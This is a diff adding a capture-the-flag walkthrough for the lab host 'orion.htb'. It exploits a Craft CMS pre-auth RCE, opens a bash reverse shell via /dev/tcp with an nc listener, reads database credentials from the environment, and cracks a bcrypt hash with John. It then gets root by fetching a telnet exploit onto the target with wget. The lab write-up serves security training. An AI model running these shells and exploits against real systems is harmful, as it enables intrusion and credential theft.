@@ -132,7 +132,194 @@ Craft CMS 5.6.16`
 With a quick search we'll find a CVE's PoC thats related to this service's version.
 
 ###  <u>CVE-2025-32432</u>
-https://nvd.nist.gov/vuln/detail/cve-2025-32432
+
+https://github.com/c0gnit00/CVE-2025-32432
 
 
-On it...
+```bash
+python3 exploit.py -u http://orion.htb -c "id"
+```
+
+**Output**
+
+```
+  ==========================================================
+   CVE-2025-32432 Craft CMS Pre-Auth RCE PoC v2              
+   Target: http://orion.htb                                                                    
+   Command: id                                                                               
+  ==========================================================  
+
+[+] Stage 1: Getting session cookie and CSRF token...
+[✓] Session ID: 9lqohmlngmfml27ra94mrb6uov
+[✓] CSRF Token: 9d3R56xr9LC03Z4dKVlZvhUAcctjjS...
+[+] Stage 2: Poisoning session file with PHP code...
+[+] Poison request returned: 200
+[✓] Session file poisoned
+[+] Stage 3: Brute-forcing asset ID (1-300)...
+[✓] Valid asset ID found: 1 (HTTP 200)
+[+] Stage 4: Triggering RCE via PhpManager gadget chain...
+[+] Target session file: /var/lib/php/sessions/sess_9lqohmlngmfml27ra94mrb6uov
+[+] Trigger request returned: 200
+[✓] COMMAND OUTPUT:
+============================================================
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+============================================================
+```
+
+The exploit was succesfull
+
+- **Revershell**
+
+```bash
+# 1. Payload on base64 to avoid issues with special characters
+echo 'setsid bash -c 'bash -i >& /dev/tcp/<ip>/4444 0>&1' </dev/null >/dev/null 2>&1 &' | base64 -w 0
+
+# 2. Listen to port
+nc -nlvp 4444
+
+# 3. Send payload
+python3 exploit.py -u http://orion.htb -c "echo <BASE64> | base64 -d | bash"
+```
+
+We are in!
+
+- Treat the terminal and go for user flag:
+
+```bash
+script /dev/null -c bash
+# Ctrl + z 
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+```
+
+---
+
+## User Flag
+
+- Once Inside start with usual enumeration.
+
+On the environmental variables we'll find usefull info:
+
+```bash
+env
+```
+```
+CRAFT_DB_PORT=3306
+CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff
+PWD=/var/www/html/craft/storage
+PRIMARY_SITE_URL=http://orion.htb/
+CRAFT_DB_DATABASE=orion
+HOME=/var/www
+CRAFT_DB_TABLE_PREFIX=
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+TERM=xterm
+USER=www-data
+SHLVL=4
+CRAFT_DB_USER=root
+LC_CTYPE=C.UTF-8
+CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
+CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
+CRAFT_DISALLOW_ROBOTS=true
+CRAFT_DEV_MODE=true
+CRAFT_ALLOW_ADMIN_CHANGES=true
+```
+
+Here we find that the database is on a server that points to the port 3306 on a loopback address.
+
+- Conect to the database and enumerate tables
+
+```bash
+mysql -h 127.0.0.1 -u root -p'SuperSecureCraft123Pass!' orion -e "SHOW TABLES;"
+```
+
+```bash
+
+```
+
+Inside we'll find a hash for `admin`:
+
+```
+$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
+```
+
+The `2y`from the beginning telss us that's bcrypt.
+
+- Use John The Ripper:
+
+```bash
+john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+```
+```
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:12 0.00% (ETA: 2026-10-01 09:32) 0g/s 14.57p/s 14.57c/s 14.57C/s manuel..jessie
+0g 0:00:00:14 0.00% (ETA: 2026-10-01 09:41) 0g/s 14.56p/s 14.56c/s 14.56C/s hellokitty..edward
+0g 0:00:00:17 0.00% (ETA: 2026-10-02 02:58) 0g/s 14.53p/s 14.53c/s 14.53C/s oliver..brenda
+0g 0:00:00:22 0.00% (ETA: 2026-10-02 11:54) 0g/s 14.52p/s 14.52c/s 14.52C/s strawberry..brianna
+darkangel        (?)     
+1g 0:00:01:06 DONE (2026-09-19 20:55) 0.01501g/s 10.27p/s 10.27c/s 10.27C/s gloria..010203
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+- Change to user `adam` using the password aquierd.
+
+The user flag is on adam's directory.
+
+**User Flag:** Aquired!
+
+---
+
+## Privilege Escalation (Root Flag)
+
+- Looking on the services running
+
+```bash
+ss -tulnp
+```
+
+We notice there is a port 23 open, which is the port for telnet.
+
+- See the version of the service 
+
+```bash
+telnet --verison
+```
+
+The version `telnet 2.7` is vulnerable.
+
+### <u>CVE-2026-24061</u>
+
+https://github.com/sh4den/CVE-2026-24061
+
+
+- Attacker
+```bash
+#Download on attacker machine
+curl -O https://raw.githubusercontent.com/sh4den/CVE-2026-24061/main/main.py
+#Open python server
+python3 -m http.server 80
+```
+
+- On victim machine
+```bash
+#create a temporal directory
+mktemp -d
+#go to that directory and get the exploit
+wget http://<your_ip>/main.py
+#Give execute perms
+chmod +x main.py
+#Use exploit
+python3 main.py -u localhost
+```
+Root user accomplished
+
+- The root flag is on root directory.
+
+**Root Flag:** Aquired!
